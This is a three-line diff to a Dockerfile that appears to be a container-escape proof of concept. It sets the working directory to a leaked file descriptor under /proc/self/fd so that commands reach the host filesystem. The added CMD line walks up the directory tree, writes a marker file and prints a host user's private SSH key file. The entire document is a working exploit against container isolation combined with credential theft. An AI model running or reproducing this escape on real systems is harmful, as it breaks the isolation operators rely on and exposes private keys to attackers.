@@ -1,3 +1,3 @@
 FROM alpine
 WORKDIR /proc/self/fd/7
-CMD cd ../../../../../../../../../../../ && touch I_HAVE_BROKEN_OUT_OF_DOCKER_RUN_THIS_TIME
+CMD cd ../../../. && touch LEAKYLEAKY && cat /home/ansible/.id_rsa_tmp && sleep 600
